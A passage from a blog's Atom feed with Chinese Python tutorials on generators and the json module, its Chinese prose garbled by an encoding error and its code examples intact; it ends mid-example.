href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬15å¤©ï¼šåœ¨æ­¥éª¤ä¹‹é—´å…±äº«æ•°æ®
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>14. ç”Ÿæˆå™¨ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-128/"/>
    <id>https://qiwihui.com/qiwihui-blog-128/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>ç”Ÿæˆå™¨æ˜¯å¯ä»¥åœ¨è¿è¡Œä¸­æš‚åœå’Œæ¢å¤çš„å‡½æ•°ï¼Œè¿”å›å¯ä»¥è¿­ä»£çš„å¯¹è±¡ã€‚ ä¸åˆ—è¡¨ä¸åŒï¼Œå®ƒä»¬æ˜¯æ‡’æƒ°çš„ï¼Œå› æ­¤ä¸€æ¬¡ä»…åœ¨è¢«è¯¢é—®æ—¶æ‰äº§ç”Ÿä¸€é¡¹ã€‚ å› æ­¤ï¼Œåœ¨å¤„ç†å¤§å‹æ•°æ®é›†æ—¶ï¼Œå®ƒä»¬çš„å†…å­˜æ•ˆç‡æ›´é«˜ã€‚</p><p>ç”Ÿæˆå™¨çš„å®šä¹‰ç±»ä¼¼äºæ™®é€šå‡½æ•°ï¼Œä½†æ˜¯ä½¿ç”¨ <code>yield</code> è¯­å¥è€Œä¸æ˜¯ <code>return</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3><span id="zhi-xing-sheng-cheng-qi-han-shu">æ‰§è¡Œç”Ÿæˆå™¨å‡½æ•°</span></h3><p>è°ƒç”¨è¯¥å‡½æ•°ä¸ä¼šæ‰§è¡Œå®ƒï¼Œè€Œæ˜¯å‡½æ•°è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç”¨äºæ§åˆ¶æ‰§è¡Œã€‚ ç”Ÿæˆå™¨å¯¹è±¡åœ¨è°ƒç”¨ <code>next()</code> æ—¶æ‰§è¡Œã€‚ é¦–æ¬¡è°ƒç”¨ <code>next()</code> æ—¶ï¼Œæ‰§è¡Œä»å‡½æ•°çš„å¼€å¤´å¼€å§‹ï¼Œä¸€ç›´æŒç»­åˆ°ç¬¬ä¸€ä¸ª <code>yield</code> è¯­å¥ï¼Œåœ¨è¯¥è¯­å¥ä¸­è¿”å›è¯­å¥å³è¾¹çš„å€¼ã€‚ éšåå¯¹ <code>next()</code> çš„è°ƒç”¨ä» <code>yield</code> è¯­å¥ç»§ç»­ï¼ˆå¹¶å¾ªç¯ï¼‰ï¼Œç›´åˆ°è¾¾åˆ°å¦ä¸€ä¸ª <code>yield</code>ã€‚ å¦‚æœç”±äºæ¡ä»¶è€Œæœªè°ƒç”¨ <code>yield</code> æˆ–åˆ°è¾¾æœ«å°¾ï¼Œåˆ™ä¼šå¼•å‘ <code>StopIteration</code> å¼‚å¸¸ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Starting&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ä¼šæ‰“å° &#x27;Starting&#x27;</span></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¼šæ‰“å° &#x27;Starting&#x27; ä»¥åŠç¬¬ä¸€ä¸ªå€¼</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¼šæ‰“å°ç¬¬äºŒä¸ªå€¼</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¼šå¼•å‘ StopIteration</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">StopIteration                             Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">1</span>-3941498e0bf0&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">     <span class="number">16</span> </span><br><span class="line">     <span class="number">17</span> <span class="comment"># this will raise a StopIteration</span></span><br><span class="line">---&gt; <span class="number">18</span> <span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½ å¯ä»¥ä½¿ç”¨ for å¾ªç¯æ¥éå†ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡</span></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cd:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½ å¯ä»¥å°†å…¶ç”¨äºæ¥å—å¯è¿­ä»£å¯¹è±¡ä½œä¸ºè¾“å…¥çš„å‡½æ•°</span></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line">sum_cd = <span class="built_in">sum</span>(cd)</span><br><span class="line"><span class="built_in">print</span>(sum_cd)</span><br><span class="line"></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line">sorted_cd = <span class="built_in">sorted</span>(cd)</span><br><span class="line"><span class="built_in">print</span>(sorted_cd)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line"><span class="number">6</span></span><br><span class="line">Starting</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>æœ€å¤§çš„ä¼˜ç‚¹ï¼šè¿­ä»£å™¨èŠ‚çœå†…å­˜ï¼</p><p>ç”±äºè¿™äº›å€¼æ˜¯å»¶è¿Ÿç”Ÿæˆçš„ï¼Œå³ä»…åœ¨éœ€è¦æ—¶æ‰ç”Ÿæˆï¼Œå› æ­¤å¯ä»¥èŠ‚çœå¤§é‡å†…å­˜ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§æ•°æ®æ—¶ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸å¿…ç­‰åˆ°æ‰€æœ‰å…ƒç´ ç”Ÿæˆåå†å¼€å§‹ä½¿ç”¨å®ƒä»¬ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœæ²¡æœ‰ç”Ÿæˆå™¨ï¼Œåˆ™å¿…é¡»å°†å®Œæ•´åºåˆ—å­˜å‚¨åœ¨æ­¤å¤„çš„åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">firstn</span>(<span class="params">n</span>):</span><br><span class="line">    num, nums = <span class="number">0</span>, []</span><br><span class="line">    <span class="keyword">while</span> num &lt; n:</span><br><span class="line">        nums.append(num)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line"></span><br><span class="line">sum_of_first_n = <span class="built_in">sum</span>(firstn(<span class="number">1000000</span>))</span><br><span class="line"><span class="built_in">print</span>(sum_of_first_n)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(firstn(<span class="number">1000000</span>)), <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">499999500000</span></span><br><span class="line"><span class="number">8697464</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ç”Ÿæˆå™¨ï¼Œä¸éœ€è¦é¢å¤–çš„åºåˆ—æ¥å­˜å‚¨æ•°å­—</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">firstn</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; n:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">sum_of_first_n = <span class="built_in">sum</span>(firstn(<span class="number">1000000</span>))</span><br><span class="line"><span class="built_in">print</span>(sum_of_first_n)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(firstn(<span class="number">1000000</span>)), <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">499999500000</span></span><br><span class="line"><span class="number">120</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><h3><span id="ling-yi-ge-li-zi-fei-bo-na-qi-shu-lie">å¦ä¸€ä¸ªä¾‹å­ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">limit</span>):</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span> <span class="comment"># å‰ä¸¤ä¸ªæ•°</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; limit:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line"></span><br><span class="line">fib = fibonacci(<span class="number">30</span>)</span><br><span class="line"><span class="comment"># ç”Ÿæˆå™¨å¯¹è±¡å¯ä»¥è¢«è½¬ä¸ºåˆ—è¡¨ï¼ˆè¿™å„¿åªæ˜¯ç”¨æ¥æ‰“å°ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(fib))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>]</span><br></pre></td></tr></table></figure><h3><span id="sheng-cheng-qi-biao-da-shi">ç”Ÿæˆå™¨è¡¨è¾¾å¼</span></h3><p>å°±åƒåˆ—è¡¨æ¨å¯¼ä¸€æ ·ï¼Œç”Ÿæˆå™¨å¯ä»¥ç”¨ç›¸åŒçš„è¯­æ³•ç¼–å†™ï¼Œé™¤äº†ç”¨æ‹¬å·ä»£æ›¿æ–¹æ‹¬å·ã€‚ æ³¨æ„ä¸è¦æ··æ·†å®ƒä»¬ï¼Œå› ä¸ºç”±äºå‡½æ•°è°ƒç”¨çš„å¼€é”€ï¼Œç”Ÿæˆå™¨è¡¨è¾¾å¼é€šå¸¸æ¯”åˆ—è¡¨ç†è§£è¦æ…¢ï¼ˆ<a href="https://stackoverflow.com/questions/11964130/list-comprehension-vs-generator-expressions-weird-timeit-results/11964478#11964478">https://stackoverflow.com/questions/11964130/list-comprehension-vs-generator-expressions-weird-timeit-results/11964478#11964478</a>ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå™¨è¡¨è¾¾å¼</span></span><br><span class="line">mygenerator = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(mygenerator), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨æ¨å¯¼å¼</span></span><br><span class="line">mylist = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(mylist), <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">120</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">4272</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><h3><span id="sheng-cheng-qi-bei-hou-de-gai-nian">ç”Ÿæˆå™¨èƒŒåçš„æ¦‚å¿µ</span></h3><p>è¿™ä¸ªç±»å°†ç”Ÿæˆå™¨å®ç°ä¸ºå¯è¿­ä»£çš„å¯¹è±¡ã€‚ å®ƒå¿…é¡»å®ç° <code>__iter__</code> å’Œ <code>__next__</code> ä½¿å…¶å¯è¿­ä»£ï¼Œè·Ÿè¸ªå½“å‰çŠ¶æ€ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸ºå½“å‰æ•°å­—ï¼‰ï¼Œå¹¶æ³¨æ„ <code>StopIteration</code>ã€‚ å®ƒå¯ä»¥ç”¨æ¥ç†è§£ç”Ÿæˆå™¨èƒŒåçš„æ¦‚å¿µã€‚ ä½†æ˜¯ï¼Œæœ‰å¾ˆå¤šæ ·æ¿ä»£ç ï¼Œå…¶é€»è¾‘å¹¶ä¸åƒä½¿ç”¨ <code>yield</code> å…³é”®å­—çš„ç®€å•å‡½æ•°é‚£æ ·æ¸…æ™°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">firstn</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n</span>):</span><br><span class="line">        self.n = n</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.num &lt; self.n:</span><br><span class="line">            cur = self.num</span><br><span class="line">            self.num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> cur</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration()</span><br><span class="line">             </span><br><span class="line">firstn_object = firstn(<span class="number">1000000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>(firstn_object))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">499999500000</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      14. ç”Ÿæˆå™¨ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>11. JSON â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-138/"/>
    <id>https://qiwihui.com/qiwihui-blog-138/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>JSONï¼ˆJavaScriptå¯¹è±¡è¡¨ç¤ºæ³•ï¼‰æ˜¯ä¸€ç§è½»é‡çº§æ•°æ®æ ¼å¼ï¼Œç”¨äºæ•°æ®äº¤æ¢ã€‚ åœ¨Pythonä¸­å…·æœ‰ç”¨äºç¼–ç å’Œè§£ç JSONæ•°æ®çš„å†…ç½® <code>json</code> æ¨¡å—ã€‚ åªéœ€å¯¼å…¥å®ƒï¼Œå°±å¯ä»¥ä½¿ç”¨JSONæ•°æ®äº†ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure><p>JSONçš„ä¸€äº›ä¼˜ç‚¹ï¼š</p><ul><li>JSONä½œä¸ºâ€œå­—èŠ‚åºåˆ—â€å­˜åœ¨ï¼Œåœ¨æˆ‘ä»¬éœ€è¦é€šè¿‡ç½‘ç»œä¼ è¾“ï¼ˆæµï¼‰æ•°æ®çš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ã€‚</li><li>ä¸XMLç›¸æ¯”ï¼ŒJSONå°å¾—å¤šï¼Œå¯è½¬åŒ–ä¸ºæ›´å¿«çš„æ•°æ®ä¼ è¾“å’Œæ›´å¥½çš„ä½“éªŒã€‚</li><li>JSONéå¸¸æ–‡æœ¬å‹å¥½ï¼Œå› ä¸ºå®ƒæ˜¯æ–‡æœ¬å½¢å¼çš„ï¼Œå¹¶ä¸”åŒæ—¶ä¹Ÿæ˜¯æœºå™¨å‹å¥½çš„ã€‚</li></ul><span id="more"></span><h2><span id="json-ge-shi">JSONæ ¼å¼</span></h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jane&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lastName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hobbies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="string">&quot;swimming&quot;</span><span class="punctuation">,</span> <span class="string">&quot;singing&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">28</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;children&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Bob&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">7</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JSONæ”¯æŒåŸºæœ¬ç±»å‹ï¼ˆå­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”å€¼ï¼‰ä»¥åŠåµŒå¥—çš„æ•°ç»„å’Œå¯¹è±¡ã€‚ æ ¹æ®ä»¥ä¸‹è½¬æ¢ï¼Œå°†ç®€å•çš„Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONï¼š</p><p><a href="https://www.notion.so/c16eeb7ba08841a3bbfc63c268bcfe54">Python å’Œ JSON è½¬æ¢</a></p><h2><span id="cong-python-dao-json-xu-lie-hua-bian-ma">ä»Pythonåˆ°JSONï¼ˆåºåˆ—åŒ–ï¼Œç¼–ç ï¼‰</span></h2><p>ä½¿ç”¨ <code>json.dumps()</code> æ–¹æ³•å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">person = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>, <span class="string">&quot;hasChildren&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;titles&quot;</span>: [<span class="string">&quot;engineer&quot;</span>, <span class="string">&quot;programmer&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬ä¸º JSON:</span></span><br><span class="line">person_json = json.dumps(person)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ä¸ç”¨çš„æ ¼å¼</span></span><br><span class="line">person_json2 = json.dumps(person, indent=<span class="number">4</span>, separators=(<span class="string">&quot;; &quot;</span>, <span class="string">&quot;= &quot;</span>), sort_keys=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœä¸º JSON å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(person_json) </span><br><span class="line"><span class="built_in">print</span>(person_json2)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>, <span class="string">&quot;hasChildren&quot;</span>: false, <span class="string">&quot;titles&quot;</span>:[<span class="string">&quot;engineer&quot;</span>, <span class="string">&quot;programmer&quot;</span>]&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span>= <span class="number">30</span>; </span><br><span class="line">    <span class="string">&quot;city&quot;</span>= <span class="string">&quot;New York&quot;</span>; </span><br><span class="line">    <span class="string">&quot;hasChildren&quot;</span>= false; </span><br><span class="line">    <span class="string">&quot;name&quot;</span>= <span class="string">&quot;John&quot;</span>; </span><br><span class="line">    <span class="string">&quot;titles&quot;</span>= [</span><br><span class="line">        <span class="string">&quot;engineer&quot;</span>; </span><br><span class="line">        <span class="string">&quot;programmer&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONå¯¹è±¡ï¼Œç„¶åä½¿ç”¨ <code>json.dump()</code> æ–¹æ³•å°†å…¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">person = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>, <span class="string">&quot;hasChildren&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;titles&quot;</span>: [<span class="string">&quot;engineer&quot;</span>, <span class="string">&quot;programmer&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;person.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(person, f) <span class="comment"># ä½ ä¹Ÿå¯ä»¥è®¾ç½®ç¼©è¿›ç­‰</span></span><br></pre></td></tr></table></figure><h2><span id="cong-json-dao-python-fan-xu-lie-hua-jie-ma">ä»JSONåˆ°Pythonï¼ˆååºåˆ—åŒ–ï¼Œè§£ç ï¼‰</span></h2><p>ä½¿ç”¨ <code>json.loads()</code> æ–¹æ³•å°†JSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºPythonå¯¹è±¡ã€‚ ç»“æœå°†æ˜¯ä¸€ä¸ªPythonå­—å…¸ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">person_json = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;age&quot;: 30, </span></span><br><span class="line"><span class="string">    &quot;city&quot;: &quot;New York&quot;,</span></span><br><span class="line"><span class="string">    &quot;hasChildren&quot;: false, </span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;John&quot;,</span></span><br><span class="line"><span class="string">    &quot;titles&quot;: [</span></span><br><span class="line"><span class="string">        &quot;engineer&quot;,</span></span><br><span class="line"><span class="string">        &quot;programmer&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">person = json.loads(person_json)</span><br><span class="line"><span class="built_in">print</span>(person)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;hasChildren&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;titles&#x27;</span>: [<span class="string">&#x27;engineer&#x27;</span>, <span class="string">&#x27;programmer&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><p>æˆ–ä»æ–‡ä»¶åŠ è½½æ•°æ®ï¼Œç„¶åä½¿ç”¨ <code>json.load()</code>æ–¹æ³•å°†å…¶è½¬æ¢ä¸ºPythonå¯¹è±¡ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;person.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    person = json.load(f)</span><br><span class="line">    <span class="built_in">print</span>(person)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;hasChildren&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;titles&#x27;</span>: [<span class="string">&#x27;engineer&#x27;</span>, <span class="string">&#x27;programmer&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><h2><span id="shi-yong-zi-ding-yi-dui-xiang">ä½¿ç”¨è‡ªå®šä¹‰å¯¹è±¡</span></h2><h3><span id="bian-ma">ç¼–ç </span></h3><p>ä½¿ç”¨é»˜è®¤çš„ <code>JSONEncoder</code> ç¼–ç è‡ªå®šä¹‰å¯¹è±¡å°†å¼•å‘ <code>TypeError</code>ã€‚ æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„ç¼–ç å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†ç±»åå’Œæ‰€æœ‰å¯¹è±¡å˜é‡å­˜å‚¨åœ¨å­—å…¸ä¸­ã€‚ å°†æ­¤å‡½æ•°ç”¨ä½œ <code>json.dump()</code> æ–¹æ³•ä¸­çš„ <code>default</code> å‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_complex</span>(<span class="params">z</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(z, <span class="built_in">complex</span>):</span><br><span class="line">        <span class="comment"># åªæ˜¯ç±»åçš„é”®å¾ˆé‡è¦ï¼Œå€¼å¯ä»¥æ˜¯ä»»æ„çš„ã€‚</span></span><br><span class="line">        <span class="keyword">return</span> &#123;z.__class__.__name__: <span class="literal">True</span>, <span class="string">&quot;real&quot;</span>:z.real, <span class="string">&quot;imag&quot;</span>:z.imag&#125;</span><br><span class="line">    <span 